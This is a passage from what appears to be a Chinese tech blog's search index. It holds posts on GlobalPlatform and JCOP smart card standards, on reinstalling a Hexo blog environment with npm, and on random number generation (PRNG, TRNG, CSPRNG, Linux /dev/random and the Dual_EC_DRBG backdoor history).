title=\"GlobalPlatform\"></a>GlobalPlatform</h2><p>1999年10月，Visa将其建立的Visa Open Platform（简称VOP）更名为GlobalPlatform（GP）并对外开放，使其成为一个由支付与商业领域的大公司、政府部门以及卖主团体主导的、跨行业的国际标准组织，这是世界上第一个跨行业的智能卡规范组织，目标就是促进多应用产业环境的管理及其安全、可互操作的业务部署。这样的话，智能卡发行商将有在各种卡、终端及后台系统中选择的自由。</p>\n<p>作为全球基于安全芯片的安全基础设施统一标准的制定者，GlobalPlatform的工作重心主要集中在安全单元（SE）、可信执行环境（TEE）和系统消息（Mobile Messaging）等领域，其成熟的技术规范是建立端到端可信业务解决方案的工具，并服务于产业环境的多个成员，支持多种商业模式。</p>\n<p>GP在全球有120多家会员企业，截至2017年，基于GP规范的安全元件出货量就已超过50亿。2015-2017年，搭载SE的移动设备达到10亿+，其全部都是基于GP的标准。</p>\n<h3 id=\"卡片的技术架构\"><a href=\"#卡片的技术架构\" class=\"headerlink\" title=\"卡片的技术架构\"></a>卡片的技术架构</h3><img src=\"/2021/07/10/%E8%B6%85%E7%BA%A7SIM%E5%8D%A1%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86%E5%88%86%E6%9E%90/gp-card-arch.png\" class=\"\">\n\n<p>GlobalPlatform是一个用于管理applet感知智能卡的规范，用于定义以下内容的操作:</p>\n<ul>\n<li>管理卡生命周期</li>\n<li>卡&#x2F;主机认证</li>\n<li>安装&#x2F;删除&#x2F;实例化&#x2F;选择小程序</li>\n<li>管理卡上的安全策略</li>\n</ul>\n<p>使用GlobalPlatform, 您将使用GP卡交换APDU以进行上述操作; 使用javacard, 您将编写可以接受和处理特定于您的应用程序的APDU的applet。<br>GlobalPlatform 并不特定于javacard,但javacard是智能卡applet开发的唯一相关技术.</p>\n<p>所有这些应用必须在一个安全的runtime环境中实现，runtime环境提供了一套硬件中立的应用编程接口以支持应用的可移植性。 GlobalPlatform并不强制规定运行时环境的实现技术。卡片管理器作为GlobalPlatform架构中的首要组件起到了 GlobalPlatform卡片中心管理者的作用，特定的密钥和安全管理应用被称作安全域，负责确保发卡方和其他安全域提供者之间的密钥的完全隔离。</p>\n<p>GP当前最新版本是v2.3。</p>\n<h3 id=\"安全的技术架构\"><a href=\"#安全的技术架构\" class=\"headerlink\" title=\"安全的技术架构\"></a>安全的技术架构</h3><img src=\"/2021/07/10/%E8%B6%85%E7%BA%A7SIM%E5%8D%A1%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86%E5%88%86%E6%9E%90/gp-sec-arch.png\" class=\"\">\n\n<p>作为卡外授权机构的卡片内代表的安全域，依据现有的三种授权机构，可以划分为三种主流类型：</p>\n<ul>\n<li>发卡方安全域（主安全域，ISD），卡片上首要的、强制性存在的安全域，是卡片管理者(通常是发卡方)在卡片内的代表；</li>\n<li>补充安全域（辅助安全域，SSD），卡片上次要的、可选择地存在的安全域，是应用提供方或发卡方以及它们的代理方在卡片内的代表；</li>\n<li>授权管理者安全域，一种特殊类型的补充安全域，授权管理者负责将某种安全策略贯彻到所有加载到卡片的应用代码上，授权管理者安全域就是授权管理者在卡片内的代表，卡片上可能存在多个这样的安全域。</li>\n</ul>\n<p>总而言之，以上三种安全域在本规范中，统称安全域。<br>安全域负责提供各类安全服务，包括密钥管理、加密解密、针对其提供者(发卡方、应用提供方、授权管理者)的应用进行数字签名的生成与验证。<br>当发卡方、应用提供方、授权管理者等卡外实体要将用到的密钥从其他实体区隔开来时，就可以通过新的安全域来代理它们实现这个需求。</p>\n<h2 id=\"JCOP\"><a href=\"#JCOP\" class=\"headerlink\" title=\"JCOP\"></a>JCOP</h2><p>最初，Java Card OpenPlatform (JCOP)是一个来自 IBM 苏黎世实验室的产品，目标是整合Javacard API和GlobalPlatform，以提供一个智能卡操作系统及完整的解决方案。<br>从2007年，JCOP成为恩智浦公司（NXP，曾经是Philips的子公司）拥有和管理，成为NXP JCOP系列芯片卡的标准操作系统。</p>\n<blockquote>\n<p>事实上，国内大多数SIM卡厂家都是直接采用NXP芯片和JCOP操作系统，甚至iPhone手机的SE芯片也是NXP提供的。</p>\n</blockquote>\n<p>NXP JCOP系列芯片卡是恩智浦NXP公司在高安全性的解决方案高性能产品，广泛应用如银行与金融，移动通信，公共交通，访客访问和网络接入等领域。支持接触式、非接触式、支持接触式与非接触式读写，内含有一个JCOP版本操作系统，并提供40k-80K字节EEPROM存储器。</p>\n<p>当前最新版本是v4，其主要技术特性包括：</p>\n<ul>\n<li>Java Card v3.0.5 Classic</li>\n<li>GlobalPlatform®<ul>\n<li>GP v2.2 Mapping Guidelines configuration v1.0.1</li>\n<li>GP v2.3 Financial Configuration v1.0 (config 2)</li>\n<li>GP v2.3 Common Implementation Configuration v2.0 - Common Criteria EAL 5+ certified (supports 3DES,<br>RSA, AES)</li>\n</ul>\n</li>\n<li>ISO 7816-3 T&#x3D;0, T&#x3D;1 (223.2 kbps)，用于接触式智能卡</li>\n<li>ISO 14443 (up to 848 kbps)，用于非接触式智能卡</li>\n<li>Dual-interface support，同时支持接触式智能卡&#x2F;非接触式智能卡的接口</li>\n</ul>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><h3 id=\"官方网站\"><a href=\"#官方网站\" class=\"headerlink\" title=\"官方网站\"></a>官方网站</h3><ul>\n<li><a href=\"https://docs.oracle.com/en/java/javacard/3.1/\">Sun JavaCard 3.1的官方网站</a></li>\n<li><a href=\"https://www.oracle.com/java/technologies/javacard-downloads.html\">JavaCard SDK的官方版本下载页</a></li>\n<li><a href=\"https://globalplatform.org/specs-library/card-specification-v2-3-1/\">GlobalPlatform Card的官方文档</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Java_Card\">Wiki of JavaCard</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Java_Card_OpenPlatform\">Wiki of JCOP</a></li>\n<li><a href=\"http://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=23B5E4704F5F2752BB0F4BD5FB33E2BC\">用于电子支付的基于近距离无线通信的移动终端安全技术要求(GB&#x2F;T 34095-2017 )</a></li>\n</ul>\n<h3 id=\"经验分享\"><a href=\"#经验分享\" class=\"headerlink\" title=\"经验分享\"></a>经验分享</h3><ul>\n<li><a href=\"https://wiki.nfc.im/\">NFC中文资料大全！！！</a></li>\n<li><a href=\"https://blog.csdn.net/songbohr/article/details/6201956\">智能卡操作系统COS概述</a></li>\n<li><a href=\"https://blog.csdn.net/qq_29605685/article/details/53127366\">JavaCard开发经验合集</a></li>\n<li><a href=\"https://www.msrfid.com/Service/javacard_introduction_under_PBOC_specification.html\">PBOC规范下的java卡介绍</a></li>\n<li><a href=\"https://blog.csdn.net/zlljsf1/article/details/4301294\">GP规范中文版的简介</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/1170054\">GP规范中定义的四种SE访问控制架构</a></li>\n<li><a href=\"https://www.geek-share.com/detail/2709904440.html\">NXP JCOP系列芯片卡特点</a></li>\n</ul>\n<h3 id=\"文档下载\"><a href=\"#文档下载\" class=\"headerlink\" title=\"文档下载\"></a>文档下载</h3><ul>\n<li><a href=\"JavaCard%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0-%E8%A5%BF%E5%AE%89%E4%BA%A4%E5%A4%A7%E6%9D%8E%E5%A2%9E%E6%99%BA.pdf\">智能卡技术的新发展 - JavaCard技术综述 - 西安交大 李增智</a></li>\n<li><a href=\"3736-05-open-platform-smart-card-cn.pdf\">Chip Operating System的技术简介</a></li>\n<li><a href=\"GPC_CardSpecification_v2.3.1_PublicRelease_CC.pdf\">GlobalPlatform Card SpecificationVersion v2.3.1 - PDF</a></li>\n<li><a href=\"NXP-JCOP-4.pdf\">恩智浦 JCOP v4 技术白皮书</a></li>\n<li><a href=\"20140415141748279422.pdf\">用于电子支付的基于近距离无线通信的移动终端安全技术要求（GB征求意见稿）</a></li>\n<li><a href=\"FSP-ACOSJ-G-Combi-CN-2.04.pdf\">龙杰智能卡的产品说明书</a></li>\n</ul>\n"},{"title":"重装Hexo编辑环境遇到的问题","url":"/2019/02/12/%E9%87%8D%E8%A3%85Hexo%E5%8F%91%E5%B8%83%E7%8E%AF%E5%A2%83%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/","content":"<h2 id=\"安装步骤\"><a href=\"#安装步骤\" class=\"headerlink\" title=\"安装步骤\"></a>安装步骤</h2><p>昨天在新Mac上重新安装Hexo Blog的编辑环境出现了不少问题，解决情况如下。</p>\n<p>1、确认已经安装node.js和npm，最简单的办法是采用图形化的安装包。<br>2、至少需要全局安装hexo和hexco-cli（hexo的命令行工具包），方法是</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm install hexo -g</span><br><span class=\"line\">sudo npm install hexo-cli -g</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<ul>\n<li>npm全局安装方式时，默认存储目录是<code>/usr/local/lib/node_modules/</code>，普通用户可能出现权限问题，需要sudo提权</li>\n<li>为了加快npm安装速度，可以提前全局安装cnpm，以后的命令可以用cnpm替代npm</li>\n</ul>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>\n\n<p>3、从Github下载blog的源代码hexo分支，并进入自动新建的子目录。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/nokiam9/nokiam9.github.io.git</span><br></pre></td></tr></table></figure>\n\n<p>4、根据当前目录的<code>package.json</code>安装项目的依赖包， 方法是：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<ul>\n<li>安装过程提示告警信息，通过<code>npm audit</code>分析，是<code>hexo-deployer-git</code>的版本过低。修改<code>package.json</code>文件，要求版本不低于1.0.0，告警消失。</li>\n</ul>\n</blockquote>\n<p>5、完成发布环境的安装，现在可以自由发布blog。</p>\n<blockquote>\n<ul>\n<li>创建了一个new page并编辑内容，但是发布结果内容为空，原因是新安装的Vscode没有设置autosave！！！  </li>\n<li>提交hexo编辑环境时，Github给出严重告警信息，原因是提交的 <code>package-lock.json</code>文件包含了敏感信息，解决方法是将该文件名添加到<code>.gitignore</code>，以阻止git提交</li>\n<li>Github Page设置了Custom Domain，但hexo提交后经常丢失，解决方法是在编辑环境的<code>/sources</code>目录增加CNAME配置文件，详细内容见<a href=\"http://www.mdslq.cn/archives/82234085.html\">参考文档</a></li>\n</ul>\n</blockquote>\n<hr>\n<h2 id=\"疑难杂症\"><a href=\"#疑难杂症\" class=\"headerlink\" title=\"疑难杂症\"></a>疑难杂症</h2><h3 id=\"node版本兼容性问题\"><a href=\"#node版本兼容性问题\" class=\"headerlink\" title=\"node版本兼容性问题\"></a>node版本兼容性问题</h3><p>2年前，首次安装<code>Hexo</code>的版本是<code>3.7.0</code>，这几天在新买的 Macbook M1 上重新安装发现了不少告警信息，主要原因是当时<code>node.js</code>的版本只有<code>v8.12.0</code>，现在的LTS版本已经是<code>v14</code>，支持M1芯片甚至需要<code>v16</code>。</p>\n<p>最好的解决办法，是将Hexo升级为最新的<code>5.4.0</code>，但是发现主页有乱码，还需要重新调整配置文件，因为懒得折腾，只好忍受这些告警信息了。</p>\n<blockquote>\n<p>虽然node.js只有<code>v16</code>以后的版本支持 M1 芯片，但是x86版本的<code>v12</code>也是可以通过兼容方式运行的，可以通过<code>n</code>进行安装，代价是node运行速度比较慢</p>\n</blockquote>\n<h3 id=\"关于package-json配置文件\"><a href=\"#关于package-json配置文件\" class=\"headerlink\" title=\"关于package.json配置文件\"></a>关于<code>package.json</code>配置文件</h3><p>以当前Hexo v3.9版本为例，其配置文件<code>package.json</code>类似于Python的<code>requirements.txt</code>，可以用于<code>npm install</code>批量安装。<br>其内容为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;name&quot;: &quot;hexo-site&quot;,</span><br><span class=\"line\">  &quot;version&quot;: &quot;0.0.0&quot;,</span><br><span class=\"line\">  &quot;private&quot;: true,</span><br><span class=\"line\">  &quot;hexo&quot;: &#123;</span><br><span class=\"line\">    &quot;version&quot;: &quot;3.9.0&quot;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &quot;dependencies&quot;: &#123;</span><br><span class=\"line\">    &quot;hexo&quot;: &quot;^3.7.0&quot;,</span><br><span class=\"line\">    &quot;hexo-deployer-git&quot;: &quot;^1.0.0&quot;,</span><br><span class=\"line\">    &quot;hexo-generator-archive&quot;: &quot;^0.1.5&quot;,</span><br><span class=\"line\">    &quot;hexo-generator-category&quot;: &quot;^0.1.3&quot;,</span><br><span class=\"line\">    &quot;hexo-generator-index&quot;: &quot;^0.2.1&quot;,</span><br><span class=\"line\">    &quot;hexo-generator-searchdb&quot;: &quot;^1.4.0&quot;,</span><br><span class=\"line\">    &quot;hexo-generator-tag&quot;: &quot;^0.2.0&quot;,</span><br><span class=\"line\">    &quot;hexo-renderer-ejs&quot;: &quot;^0.3.1&quot;,</span><br><span class=\"line\">    &quot;hexo-renderer-marked&quot;: &quot;^0.3.2&quot;,</span><br><span class=\"line\">    &quot;hexo-renderer-stylus&quot;: &quot;^0.3.3&quot;,</span><br><span class=\"line\">    &quot;hexo-server&quot;: &quot;^0.3.1&quot;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>为此，可以分析出hexo所包含的几类包：</p>\n<ul>\n<li><code>hexo</code>：主代码包，最新版本5.4，目前仍然使用3.9，在node版本8运行良好，版本12有告警，版本14以上问题多</li>\n<li><code>hexo-cli</code>：hexo的命令行，以支持<code>hexo s</code> ,<code>hexo d -g</code>等命令行</li>\n<li><code>hexo-deployer-git</code>：用于deploy部署的插件</li>\n<li><code>hexo-server</code>:内置的web服务器，用于<code>hexo server</code></li>\n<li><code>hexo-renderer-xxx</code>：内建<code>Swig</code>模板引擎，还可以另外安装插件来获得<code>EJS</code>、<code>Haml</code>或<code>Jade</code>支持，Hexo根据模板文件的扩展名来决定所使用的模板引擎。</li>\n<li><code>hexo-generator-xxx</code>：语言模版插件，包括Head部分的index、search菜单的转化</li>\n</ul>\n<blockquote>\n<p>升级hexo 5.4版本时，首页出现乱码，其实原因是<code>hexo-renderer-swig</code>从自动安装改为需要手工安装，另外npm 安装即可解决。</p>\n</blockquote>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"http://imbajin.com/2016-10-06-Hexo%E6%8A%80%E5%B7%A7%E5%92%8C%E7%BB%8F%E9%AA%8C%E4%B8%80/\">Hexo技巧与经验之升级</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/157511323\">将 Hexo 升级到 v4.2.1</a></li>\n</ul>\n"},{"title":"随机数生成技术概述","url":"/2022/10/05/%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/","content":"<p>在密码学中，熵（entropy，指不可预测的随机性）扮演了一个非常重要的角色，许多算法都要求使用一个不可预测的随机数，只有在生成的随机数不可预测时，这些算法才能保证其安全性，典型应用包括：</p>\n<ul>\n<li>密钥生成</li>\n<li>生成初始化向量，IV，用于分组密码的 CBC，CFB，OFB 模式</li>\n<li>某些签名方案中的盐，如 ECDSA， RSASSA-PSS</li>\n</ul>\n<h2 id=\"一、伪随机数生成器-PRNG\"><a href=\"#一、伪随机数生成器-PRNG\" class=\"headerlink\" title=\"一、伪随机数生成器 - PRNG\"></a>一、伪随机数生成器 - PRNG</h2><p>PRNG（Pseudo-Random Number Generators）是一种数字序列的生成算法，它生成出的数字序列的统计学属性跟真正的随机数序列非常相似，但它生成的伪随机数序列并不是真正的随机数序列！<br>换句话说，如果输入的初始种子是相同的，PRNG 总是会生成出相同的伪随机数序列，因此也被称为<strong>确定性随机比特生成器</strong>（DRBG，Deterministic Random Bit Generator）。</p>\n<p>伪随机数通常来源于某个生成算法（例如，C库中提供的rand函数），尽管存在可复现的问题，但由于 PRNG 的成本低和速度快，仍然广泛用于现代软件开发中。NIST SP 800-90A规范中描述了三种产生伪随机数的算法：</p>\n<ul>\n<li>Hash_DRBG：使用单向散列算法作为伪随机数生成的基础算法</li>\n<li>HMAC_DRBG：使用消息认证码算法作为随机数生成的基础算法</li>\n<li>CTR_DRBG：使用分组密码算法的计数器模式作为随机数生成的基础算法，可选算法包括 3DES 、AES128 、 AES192 或 AES256 等</li>\n</ul>\n<p>实际运用中，我们经常使用 PRNG 从一个很小的初始随机性（熵）生成出大量的伪随机性，这被称做<strong>密钥拉伸</strong>（Key Stretching）。</p>\n<h2 id=\"二、真随机数生成器-TRNG\"><a href=\"#二、真随机数生成器-TRNG\" class=\"headerlink\" title=\"二、真随机数生成器 - TRNG\"></a>二、真随机数生成器 - TRNG</h2><p>TRNG（True Random Number Generators）作为“真正的随机数，需要具备<strong>不可重现性</strong>（不能通过给定同样的数据而演算出同一串比特序列），由于计算机算法均具备确定的特性，所以真随机数无法由算法来生成，只能基于硬件设备通过对物理过程的测量来实现，因此也被称为<strong>硬件随机数生成器</strong>（HRNG，Hardware Random Number Generator）。</p>\n<p>TRNG 通常基于一些能生成低等级、统计学随机的“噪声”信号的微观现象，包括：基于环形振荡器采样、直接放大热噪声、基于亚稳态电路Ell、光电效应、利用放射性元素衰变等量子力学的基本量等，这些物理过程在理论上是完全不可预测的，并且已经得到了实验的证实。<br>TRNG 通常由换能器、放大器和模拟数字转换器组成。其中换能器将物理过程中的某些效果转换为电信号，放大器将随机扰动的振幅放大到宏观级别，而模拟数字转换器则将输出变成数字。<br>TRNG 从随机过程中收获熵之后，还需要通过后处理技术（诺伊曼校正、异或链、线性反馈移位寄存器、异或周期序列等）消除随机位的概率偏差，并重复重采样过程以满足随机数的长度需求，最后输出高质量的随机数。Apple 安全隔区和恩智浦 STM32 系列安全芯片等都内置了 TRNG 组件。</p>\n<ul>\n<li>TRNG 满足“完全随机性”，即：不可预测性、均匀性、独立性，并具备保密性要求</li>\n<li>由于 TRNG 来源于物理过程，生成速度很慢，通常每秒只能产生很有限的随机比特</li>\n<li>为了提高数据产生效率，TRNG 通常用于生成伪随机数生成器的“种子”，也就是<strong>熵源（熵池）</strong></li>\n</ul>\n<h2 id=\"三、密码学安全随机数生成器-CSPRNG\"><a href=\"#三、密码学安全随机数生成器-CSPRNG\" class=\"headerlink\" title=\"三、密码学安全随机数生成器 - CSPRNG\"></a>三、密码学安全随机数生成器 - CSPRNG</h2><p>由于 PRNG 无法为随机数提供<strong>不可预测性</strong>，存在安全隐患，但是 TRNG 的生成速度又太慢，无法及时提供大量随机数，怎么解决这个矛盾呢？答案就是CSPRNG。</p>\n<p>CSPRNG（Cryptography Secure Random Number Generators）是一种满足密码学安全要求的 PRNG，需要同时满足以下条件：</p>\n<ul>\n<li>不可预测性：即使有人获知了该 PRNG 的 k 位，他也无法使用合理的资源预测第 k+1 位的值</li>\n<li>不可回溯性：如果攻击者猜出了 PRNG 的内部状态或该状态因某种原因而泄漏，攻击者也无法重建出内部状态泄漏之前生成的所有随机数</li>\n</ul>\n<p>美国国家标准和技术研究所(NIST)制定了随机数发生器的技术规范，称为<code>NIST SP 800 - 22</code>和<code>SP 800 - 90</code>，其推荐的技术路线是 TRNG + PRNG，即 TRNG 作为熵源提供少量且高质量的随机数，通过 PRNG 进行提供大量随机数，这就是 CSPRNG 最常用的设计方法。</p>\n<p>大多数的 CSPRNG 结合使用来自 OS 的熵与高质量的 PRNG，并且一旦系统生成了新的熵（这可能来自用户输入、磁盘 IO、系统中断、或者硬件 RNG），CSPRNG 会立即使用新的熵来作为 PRNG 新的种子。 这种不断重置 PRNG 种子的行为，使随机数变得非常难以预测。</p>\n<ul>\n<li>基于计数器(CTR)模式下的安全分组密码、流密码或安全散列函数的 CSPRNG</li>\n<li>基于数论设计的 CSPRNG，它依靠整数分解问题（IFP）、离散对数问题（DLP）或椭圆曲线离散对数问题（ECDLP）的高难度来确保安全性</li>\n<li>CSPRNG 基于加密安全随机性的特殊设计，例如 Yarrow algorithm 和 Fortuna，这俩分别被用于 MacOS 和 FreeBSD.</li>\n</ul>\n<h2 id=\"四、对比分析\"><a href=\"#四、对比分析\" class=\"headerlink\" title=\"四、对比分析\"></a>四、对比分析</h2><table>\n<thead>\n<tr>\n<th align=\"center\">TRNG</th>\n<th align=\"center\">CSPRNG</th>\n<th align=\"center\">PRNG</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">不可重现性</td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">不可预测性</td>\n<td align=\"center\">不可预测性</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">不可回溯性</td>\n<td align=\"center\">不可回溯性</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">无偏性</td>\n<td align=\"center\">无偏性</td>\n<td align=\"center\">无偏性</td>\n</tr>\n</tbody></table>\n<ul>\n<li>不可重现性：相同的输入必须生成不同的输出</li>\n<li>不可预测性：即使有人获知了该 PRNG 的 k 位，他也无法使用合理的资源预测第 k+1 位的值</li>\n<li>不可回溯性：如果攻击者猜出了 PRNG 的内部状态或该状态因某种原因而泄漏，攻击者也无法重建出内部状态泄漏之前生成的所有随机数</li>\n<li>无偏性：任何数均有平等出现的机会</li>\n</ul>\n<h2 id=\"五、Unix系统的技术实现\"><a href=\"#五、Unix系统的技术实现\" class=\"headerlink\" title=\"五、Unix系统的技术实现\"></a>五、Unix系统的技术实现</h2><p>随机数在操作系统中非常重要，TCP&#x2F;IP 序列号、密码盐和 DNS 源端口号都依赖于随机数。CSPRNG 经常被用于以下场景：</p>\n<ul>\n<li>随机密钥的产生。比如为对称密码算法加密提供随机密钥。</li>\n<li>一次性随机序列的产生。比如用于通信协议，可以防止回放攻击。</li>\n<li>用于口令保护的盐(salt)的产生，可以防止口令的预计算攻击（也叫字典攻击）</li>\n<li>一次一密。比如直接拿来跟明文异或生成密文，但是只能用一次</li>\n</ul>\n<p>类Unix系统通过如下两个虚拟设备提供 CSPRNG:</p>\n<ul>\n<li><code>/dev/random</code>（受限阻塞随机生成器）: 从这个设备中读取到的是内核熵池中已经收集好的熵，如果熵池空了，此设备会一直阻塞，直到收集到新的环境噪声。</li>\n<li><code>/dev/urandom</code>（不受限非阻塞随机生成器）: 它可能会返回内核熵池中的熵，也可能返回使用<code>之前收集的熵 + CSPRNG</code>计算出的安全伪随机数。它不会阻塞。</li>\n</ul>\n<p><img src=\"/2022/10/05/%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/random.jpeg\" alt=\"random\"></p>\n<p>注意！两者产生的随机数都是从同一个熵池（主熵池）中提取的，只有当各自的熵池耗尽了，它们的行为才有所不同。</p>\n<p>一般有个规则，&#x2F;dev&#x2F;random 产生的随机数质量高，主要用于一些安全方面，而且，它是阻塞的，对于大部分应用来说，这是不能接受的</p>\n<p>对于 &#x2F;dev&#x2F;urandom ，当熵池计数器足够的时候，产生真随机数，计数不够的时候，产生伪随机数，最重要的是 它不会阻塞，而且，对于绝大多数的应用来说，伪随机数也能很好的满足需求了</p>\n<h3 id=\"常用命令\"><a href=\"#常用命令\" class=\"headerlink\" title=\"常用命令\"></a>常用命令</h3><p>在 Linux上，可以通过下面的命令查看当前系统主熵池大小, 单位是二进制位的数量</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost ~]# cat /proc/sys/kernel/random/poolsize</span><br><span class=\"line\">4096</span><br></pre></td></tr></table></figure>\n\n<p>提取随机数并转换为 Base64 编码<br><code>head -c 32 /dev/random | base64</code></p>\n<p>随机转换为md5（20位）：<br><code>head /dev/urandom | md5sum | head -c 20</code></p>\n<p>随机纯数字（20位）：<br><code>head /dev/urandom | tr -dc 0-9 | head -c 20</code></p>\n<p>随机小写字母+数字（20位）：<br><code>head /dev/urandom | tr -dc a-z0-9 | head -c 20</code></p>\n<p>随机大小写字母+数字（20位）：<br><code>head /dev/urandom | tr -dc A-Za-z0-9 | head -c 20</code></p>\n<p>使用系统环境变量($RANDOM)生成随机数<br><code>echo $RANDOM | md5sum | cut -c 5-11</code></p>\n<h3 id=\"编程接口\"><a href=\"#编程接口\" class=\"headerlink\" title=\"编程接口\"></a>编程接口</h3><p>常见编程语言的 CSPRNG 接口或库如下：</p>\n<ul>\n<li>Java: <code>java.security.SecureRandom</code></li>\n<li>Python: <code>secrets</code> 库或者 <code>os.urandom()</code></li>\n<li>C#: <code>System.Security.Cryptography.RandomNumberGenerator.Create()</code></li>\n<li>JavaScript: 客户端可使用 <code>window.crypto.getRandomValues(Uint8Array)</code>，服务端可使用 <code>crypto.randomBytes()</code></li>\n</ul>\n<hr>\n<h2 id=\"附录一：Apple-提供的CSPRNG\"><a href=\"#附录一：Apple-提供的CSPRNG\" class=\"headerlink\" title=\"附录一：Apple 提供的CSPRNG\"></a>附录一：Apple 提供的CSPRNG</h2><p>Apple 为此提供了运行在 iOS、iPadOS、macOS、Apple tvOS 和 watchOS 内核中的受信任软件 CPRNG（&#x3D; CSPRNG）。它负责聚合系统中的原始熵并为内核和用户空间的使用者提供安全的随机数。</p>\n<p>内核 CPRNG 源自启动过程中的多个熵源并存在于设备的整个生命周期。这些来源包括（取决于可用性）：</p>\n<ul>\n<li>安全隔区硬件 TRNG</li>\n<li>启动过程中所收集基于时序的时间误差</li>\n<li>从硬件中断收集的熵</li>\n<li>用于启动过程中保持熵的种子文件</li>\n<li>Intel 随机指令，例如 RDSEED 和 RDRAND（仅限基于 Intel 的 Mac）</li>\n</ul>\n<p>内核 CPRNG 的设计源自 Fortuna 算法，旨在满足 256 位安全级别。它使用以下 API 为用户空间使用者提供高质量的随机数：</p>\n<ul>\n<li>getentropy(2) 系统调用</li>\n<li>随机设备 (&#x2F;dev&#x2F;random)</li>\n</ul>\n<p>内核 CPRNG 通过写入随机设备接受用户提供的熵。</p>\n<h2 id=\"附录二：DUAL-EC-DRBG-的安全漏洞\"><a href=\"#附录二：DUAL-EC-DRBG-的安全漏洞\" class=\"headerlink\" title=\"附录二：DUAL_EC_DRBG 的安全漏洞\"></a>附录二：DUAL_EC_DRBG 的安全漏洞</h2><p>2005年，NIST SP 800-90A草案公开发布，其包含四个随机数生成算法：HASH_DRBG, HMAC_DRBG, CTR_DRBG, DUAL_EC_DRBG。</p>\n<p>2006年，NTNU（挪威科技大学）的 Kristian Gjøsteen 公开宣称“<strong>Dual_EC_DRBG is not cryptographically sound</strong>”，并构造了一个具有 0.0011 优势的 bit-predictor，证明了其不满足 CSPRNG 的随机数发生器设计原理。</p>\n<p>在 Crypto 2007（原美密会，现为国际密码会议）会议上，Bruce Schneier 宣布该标准中存在技术后门，使得拥有某特殊资源的攻击者能够轻而易举地攻击其中的 Dual ECC DRBG 随机数产生器算法，从而得到该算法后续的所有随机数值。</p>\n<p>2013年，Edward Snowden 泄露的内部备忘录曝光了 NSA 的 Bullrun 项目，显示该项目在 Dual_EC_DRBG 中植入了一个后门。</p>\n<p>2013年9月19日，EMC 公司的 RSA 事业本部宣布，该公司已向 BSAFE（一个用于开发安全应用的工具套件） 及 Data Protection Manager（一个用于数据加密的工具）的客户发出呼吁，不要使用其默认的 Dual_EC_DRBG 技术标准，RSA 目前正在审查其所有的产品。</p>\n<p>路透社报道，NSA 向 RSA 支付了一千万美元，要求其在 BSAFE 中将 Dual_EC_DRBG 设为默认的 CSPRNG。随后，RSA公司发表声明否认与 NSA 有任何的秘密接触，以便在BSAFE加密库中放置有缺陷的随机数生成器算法，但并未否认或者解释之前与 NSA 之间的大额交易。</p>\n<p>行业普遍认为，Dual_EC_DRBG 算法可能潜伏着一个后门，如果以特定方式选择定义算法的一个参数，NSA 将可能预测出算法产生的随机数。</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><h3 id=\"技术分析\"><a href=\"#技术分析\" class=\"headerlink\" title=\"技术分析\"></a>技术分析</h3><ul>\n<li><a href=\"https://thiscute.world/posts/practical-cryptography-basics-4-secure-random-generators/\">写给开发人员的实用密码学（四）—— 安全随机数生成器 CSPRNG</a></li>\n<li><a href=\"https://securitygossip.com/blog/2020/03/16/pseudorandom-black-swans-cache-attacks-on-ctr-drbg/\">CTR-DRBG的缓存侧信道攻击方法</a></li>\n<li><a href=\"https://blog.51cto.com/u_13640625/3027985\">伪随机数生成器（ctr_drbg）的配置与使用</a></li>\n<li><a href=\"https://blog.csdn.net/a00553344/article/details/3978312\">随机数发生器设计原理及实现</a></li>\n<li><a href=\"https://ms2008.github.io/2017/10/24/PRNG/\">正确认识随机数 - 北京车牌摇号的算法是公平的</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/384238870\">让你彻底理解Base64算法</a></li>\n</ul>\n<h3 id=\"文档下载\"><a href=\"#文档下载\" class=\"headerlink\" title=\"文档下载\"></a>文档下载</h3><ul>\n<li><a 